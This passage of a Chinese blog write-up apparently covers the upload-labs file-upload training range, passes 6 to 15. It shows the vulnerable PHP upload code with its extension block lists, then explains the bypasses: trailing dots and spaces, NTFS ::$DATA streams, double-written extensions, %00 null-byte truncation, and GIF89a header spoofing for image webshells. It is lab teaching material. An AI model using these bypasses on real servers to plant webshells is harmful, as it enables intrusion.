$file_ext);//去除字符串::$DATA</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &apos;/&apos; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;此文件不允许上传&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="解题办法"><a href="#解题办法" class="headerlink" title="解题办法"></a>解题办法</h3><p>这里可以利用windows下的特性，文件名最后增加<strong>点和空格</strong>，写成<code>phpinfo.php.</code>，上传后保存在Windows系统上的文件名最后的一个<code>.</code>会被去掉，实际上保存的文件名就是<code>phpinfo.php</code></p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528724038572.png" alt="img"></p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528724105005.png" alt="img"></p>
+<h2 id="pass-07"><a href="#pass-07" class="headerlink" title="pass 07"></a>pass 07</h2><h3 id="代码分析-6"><a href="#代码分析-6" class="headerlink" title="代码分析"></a>代码分析</h3><p>第7关代码与第6关有点像，多了个<code>trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;])</code>，然后做了黑名单。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">        $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &apos;/&apos; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;此文件不允许上传&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="解题办法-1"><a href="#解题办法-1" class="headerlink" title="解题办法"></a>解题办法</h3><p>和第六关一样，文件名后加点，改成<code>phpinfo.php.</code> 就可以绕过了。</p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528724485500.png" alt="img"></p>
+<h2 id="pass-08"><a href="#pass-08" class="headerlink" title="pass 08"></a>pass 08</h2><h3 id="代码分析-7"><a href="#代码分析-7" class="headerlink" title="代码分析"></a>代码分析</h3><p>从代码来看，与第7关的差别是<code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</code>，依然是设置了黑名单。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &apos;/&apos; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;此文件不允许上传&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="解题方法-5"><a href="#解题方法-5" class="headerlink" title="解题方法"></a>解题方法</h3><p>由于我们的环境操作系统是windows，这里可以通过Windows文件流特性绕过。<code>phpinfo.php::$DATA</code></p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528725280932.png" alt="img"></p>
+<p>这里来个扩展，简单介绍下 NTFS 交换数据流 。</p>
+<h4 id="NTFS-交换数据流"><a href="#NTFS-交换数据流" class="headerlink" title="NTFS 交换数据流"></a>NTFS 交换数据流</h4><p>NTFS 是微软Windows NT内核的系列操作系统支持的，是为了解决网络和磁盘配额，文件加密等安全特性所设计的磁盘格式，比FAT文件系统更加稳定，也更加安全。</p>
+<p>NTFS-ADS，又称为 NTFS 交换数据流，是NTFS磁盘格式的一个特性。</p>
+<p>在NTFS文件系统下，每个文件都可以存在多个数据流，也就是说，除了主文件流之外，还可以有很多非主文件流寄宿在主文件流中。虽然我们无法看到数据流文件，但是它是真实存在于我们系统之中的。</p>
+<p>格式如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;filename&gt;:&lt;stream name&gt;:&lt;stream type&gt;</span><br></pre></td></tr></table></figure>
+<p>有如下payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo.php:jpg</span><br></pre></td></tr></table></figure>
+<p>流类型以$开头，默认流类型为data，如上payload的完整形式其实是:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo.php:jpg:$data</span><br></pre></td></tr></table></figure>
+<p>文件内容在数据流文件中，我们当初上传的就是一个文件流文件，之所以会顺带生成phpinfo.php，是因为它没有找到自己的宿主文件，所以才创建了一个。</p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528725632302.png" alt="img"></p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528725643907.png" alt="img"></p>
+<p>同理 phpinfo.php::$DATA 可以写入文件，是因为它确实向phpinfo.php写入了内容。</p>
+<h2 id="pass-09"><a href="#pass-09" class="headerlink" title="pass 09"></a>pass 09</h2><h3 id="代码分析-8"><a href="#代码分析-8" class="headerlink" title="代码分析"></a>代码分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &apos;.&apos;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $_FILES[&apos;upload_file&apos;][&apos;name&apos;])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . &apos;/&apos; . $file_name;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;此文件不允许上传&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这关的代码其实和第六关有点像，这里差别在</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">$file_ext = trim($file_ext); //首尾去空</span><br></pre></td></tr></table></figure>
+<p>差别就是多了这两段代码。</p>
+<h3 id="解题方法-6"><a href="#解题方法-6" class="headerlink" title="解题方法"></a>解题方法</h3><p>上传文件名后加上<strong>点+空格+点</strong>，改为<code>phpinfo.php. .</code></p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528726167223.png" alt="img"></p>
+<p>可以看到最后的点没了。</p>
+<h2 id="pass-10"><a href="#pass-10" class="headerlink" title="pass 10"></a>pass 10</h2><h3 id="代码分析-9"><a href="#代码分析-9" class="headerlink" title="代码分析"></a>代码分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&apos;submit&apos;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br><span class="line">        if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $UPLOAD_ADDR . &apos;/&apos; . $file_name)) &#123;</span><br><span class="line">            $img_path = $UPLOAD_ADDR . &apos;/&apos; .$file_name;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &apos;文件夹不存在,请手工创建！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>从代码来看，这里会将黑名单里的后缀名替换成空。</p>
+<h3 id="解题方法-7"><a href="#解题方法-7" class="headerlink" title="解题方法"></a>解题方法</h3><p>双写后缀名绕过<code>phpinfo.pphphp</code>。</p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528726416416.png" alt="img"></p>
+<h2 id="pass-11"><a href="#pass-11" class="headerlink" title="pass 11"></a>pass 11</h2><h3 id="代码分析-10"><a href="#代码分析-10" class="headerlink" title="代码分析"></a>代码分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">    $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);</span><br><span class="line">    $file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">        $img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg = &apos;上传失败！&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这里设置了白名单，从代码来说应该是没有问题的，但是这里路径采用拼接的办法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br></pre></td></tr></table></figure>
+<p>我们当前环境是php 5.2因此存在%00截断问题。</p>
+<h3 id="解题方法-8"><a href="#解题方法-8" class="headerlink" title="解题方法"></a>解题方法</h3><p><img src="/2018/06/12/文件上传漏洞writeup/1528726904003.png" alt="img"></p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528726942666.png" alt="img"></p>
+<h2 id="pass-12"><a href="#pass-12" class="headerlink" title="pass 12"></a>pass 12</h2><h3 id="代码分析-11"><a href="#代码分析-11" class="headerlink" title="代码分析"></a>代码分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">    $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);</span><br><span class="line">    $file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">        $img_path = $_POST[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            $msg = &quot;上传失败&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>第12关于第十一关差别就在于原来的<code>$_GET[&#39;save_path&#39;]</code>变成了POST。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_POST[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br></pre></td></tr></table></figure>
+<h3 id="解题方法-9"><a href="#解题方法-9" class="headerlink" title="解题方法"></a>解题方法</h3><p>还是通过截断绕过。</p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528727255867.png" alt="img"></p>
+<p>这里通过%00截断报错了。其实问题就在于%00其实通过get方式经过url解码之后是空字符，所以这里要产生空字符，需要通过hex方式，修改成0x00。</p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528727439843.png" alt="img"></p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528727465967.png" alt="img"></p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528727493223.png" alt="img"></p>
+<p>由于两个地方涉及到了%00截断，这里简单记录下原理。</p>
+<h4 id="php-00截断原理"><a href="#php-00截断原理" class="headerlink" title="php %00截断原理"></a>php %00截断原理</h4><p>截断类型：php %00截断</p>
+<p>截断条件：</p>
+<ol>
+<li>php版本小于5.3.4 详情关注<code>CVE-2006-7243</code></li>
+<li>php的<code>magic_quotes_gpc</code>为OFF状态</li>
+</ol>
+<p>%00截断有这么2种利用状况</p>
+<ol>
+<li>在url中加入%00，如<a href="http://xxxx/shell.php%00.jpg" target="_blank" rel="noopener">http://xxxx/shell.php%00.jpg</a></li>
+<li>在burpsuite的16进制编辑工具将”shell.php .jpg”（带空格的）中间的空格由20改成00</li>
+</ol>
+<p>url中的%00（只要是这种%xx）的形式，webserver会把它当作十六进制处理，然后把16进制的hex自动翻译成ascii码值“NULL”,实现了截断burpsuite中16进制编辑器将空格20改成了00，跟上面一样的变成asccii的null。</p>
+<h2 id="pass-13"><a href="#pass-13" class="headerlink" title="pass 13"></a>pass 13</h2><h3 id="代码分析-12"><a href="#代码分析-12" class="headerlink" title="代码分析"></a>代码分析</h3><p>从代码来看就是检查文件头部。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function getReailFileType($filename)&#123;</span><br><span class="line">    $file = fopen($filename, &quot;rb&quot;);</span><br><span class="line">    $bin = fread($file, 2); //只读2字节</span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(&quot;C2chars&quot;, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[&apos;chars1&apos;].$strInfo[&apos;chars2&apos;]);    </span><br><span class="line">    $fileType = &apos;&apos;;    </span><br><span class="line">    switch($typeCode)&#123;      </span><br><span class="line">        case 255216:            </span><br><span class="line">            $fileType = &apos;jpg&apos;;</span><br><span class="line">            break;</span><br><span class="line">        case 13780:            </span><br><span class="line">            $fileType = &apos;png&apos;;</span><br><span class="line">            break;        </span><br><span class="line">        case 7173:            </span><br><span class="line">            $fileType = &apos;gif&apos;;</span><br><span class="line">            break;</span><br><span class="line">        default:            </span><br><span class="line">            $fileType = &apos;unknown&apos;;</span><br><span class="line">        &#125;    </span><br><span class="line">        return $fileType;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="解题方法-10"><a href="#解题方法-10" class="headerlink" title="解题方法"></a>解题方法</h3><p>绕过文件头检查，添加GIF图片的文件头<code>GIF89a</code>，绕过GIF图片检查。</p>
+<p><img src="/2018/06/12/文件上传漏洞writeup/1528806906184.png" alt="img"></p>
+<p>但是这里有个问题，这里上传的是图片马，如果没有文件包含的话其实是用不了的，但是这道题提示信息就是要求我们上传图片马。</p>
+<h2 id="pass-14"><a href="#pass-14" class="headerlink" title="pass 14"></a>pass 14</h2><h3 id="代码分析-13"><a href="#代码分析-13" class="headerlink" title="代码分析"></a>代码分析</h3><p>这题一样使用<code>getimagesize</code>函数判断文件类型，但是这个函数也是检查文件头，是不可信的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    $types = &apos;.jpeg|.png|.gif&apos;;</span><br><span class="line">    if(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[2]);</span><br><span class="line">        if(stripos($types,$ext))&#123;</span><br><span class="line">            return $ext;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="解题方法-11"><a href="#解题方法-11" class="headerlink" title="解题方法"></a>解题方法</h3><p><img src="/2018/06/12/文件上传漏洞writeup/1528807062589.png" alt="img"></p>
+<p>一样上传完后无法解析，除非有文件包含问题，或者是解析漏洞，但是题目要求上传图片马。</p>
+<h2 id="pass-15"><a href="#pass-15" class="headerlink" title="pass 15"></a>pass 15</h2><h3 id="代码分析-14"><a href="#代码分析-14" class="headerlink" title="代码分析"></a>代码分析</h3><p><code>exif_imagetype</code>的作用是判断一个图像的类型 ，其实是读取一个图像的第一个字节并检查其签名。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function isImage($filename)&#123;</span><br><span class="line">    //需要开启php_exif模块</span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    switch ($image_type) &#123;</span><br><span class="line">        case IMAGETYPE_GIF:</span><br><span class="line">            return &quot;gif&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case IMAGETYPE_JPEG:</span><br><span class="line">            return &quot;jpg&quot;;</span><br><span class="line">            break;</span><br><span class="line">        case IMAGETYPE_PNG:</span><br><span class="line">            return &quot;png&quot;;</span><br><span class="line">            break;    </span><br><span class="line">        default:</span><br><span class="line">            return false;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="解题方法-12"><a href="#解题方法-12" class="headerlink" title="解题方法"></a>解题方法</h3><p>添加<code>GIF89a</code>的文件头就可以绕过了</p>
